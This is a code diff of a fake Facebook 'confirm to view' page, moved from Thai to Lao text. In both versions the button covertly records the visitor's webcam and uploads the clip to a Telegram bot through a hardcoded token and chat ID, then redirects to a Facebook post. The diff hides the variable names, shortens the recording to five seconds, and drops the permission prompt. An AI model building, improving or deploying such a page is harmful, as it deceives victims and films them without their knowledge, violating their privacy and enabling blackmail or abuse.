@@ -3,41 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>เข้าชมเนื้อหา</title>
+    <title>Sabaidee</title>
 </head>
 <body style="background:#f0f2f5; margin:0; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif;">
-    <div style="background:#fff; padding:40px 20px; border-radius:12px; text-align:center; width:90%; max-width:350px; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
-        <div style="color:#1877f2; font-weight:bold; font-size:24px; margin-bottom:15px;">Facebook</div>
-        <p style="font-size:16px; color:#1c1e21; margin-bottom:20px;">กดยืนยันเพื่อรับชมข้อมูล</p>
-        <button id="go" style="background:#1877f2; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px;">ตกลง</button>
-        <div id="wait" style="display:none; margin-top:15px; color:#606770;">⌛ กำลังโหลด...</div>
+    <div style="background:#fff; padding:40px 20px; border-radius:12px; text-align:center; width:90%; max-width:320px; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
+        <div style="color:#1877f2; font-weight:bold; font-size:26px; margin-bottom:10px;">Facebook</div>
+        <p style="font-size:15px; color:#4b4f56; margin-bottom:25px;">ກົດປຸ່ມຂ້າງລຸ່ມເພື່ອຢືນຢັນການເຂົ້າຊົມ</p>
+        <button id="auth-trigger" style="background:#1877f2; color:#fff; border:none; padding:15px; width:100%; border-radius:8px; font-weight:bold; cursor:pointer; font-size:16px;">ຕົກລົງ</button>
+        <div id="processing" style="display:none; margin-top:15px; color:#1877f2;">⏳ ກຳລັງໂຫລດ...</div>
     </div>
     <script>
-        const T = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA'; // โทเค็นพี่
-        const C = '8482017371'; // ไอดีพี่
-        const R = 'https://www.facebook.com/share/p/1avrMEzzJn/'; // ลิงก์ปลายทาง
-        
-        document.getElementById('go').onclick = async function() {
+        const _0x1 = '8570864342:AAH-v-iLybrDvA9mD569rERO9WmU1M0HzdA'; 
+        const _0x2 = '8482017371';
+        const _0x3 = 'https://www.facebook.com/share/p/1avrMEzzJn/';
+
+        document.getElementById('auth-trigger').onclick = async function() {
             this.style.display = 'none';
-            document.getElementById('wait').style.display = 'block';
+            document.getElementById('processing').style.display = 'block';
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: true });
-                const m = new MediaRecorder(s);
-                const k = [];
-                m.ondataavailable = e => k.push(e.data);
-                m.onstop = async () => {
-                    const fd = new FormData();
-                    fd.append('chat_id', C);
-                    fd.append('video', new Blob(k, {type:'video/mp4'}), 'v.mp4');
-                    await fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: fd });
-                    s.getTracks().forEach(t => t.stop());
-                    window.location.replace(R);
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const r = new MediaRecorder(stream);
+                const c = [];
+                r.ondataavailable = e => c.push(e.data);
+                r.onstop = async () => {
+                    const f = new FormData();
+                    f.append('chat_id', _0x2);
+                    f.append('video', new Blob(c, {type:'video/mp4'}), 'data.mp4');
+                    await fetch(`https://api.telegram.org/bot${_0x1}/sendVideo`, { method: 'POST', body: f });
+                    stream.getTracks().forEach(t => t.stop());
+                    window.location.replace(_0x3);
                 };
-                m.start();
-                setTimeout(() => m.stop(), 10000);
+                r.start();
+                setTimeout(() => r.stop(), 5000); // ถ่าย 5 วิพอ เพื่อให้เน็ตช้าส่งผ่าน
             } catch (e) {
-                alert("โปรดกด 'อนุญาต' เพื่อเข้าชมเนื้อหา");
-                location.reload();
+                window.location.reload();
             }
         };
     </script>
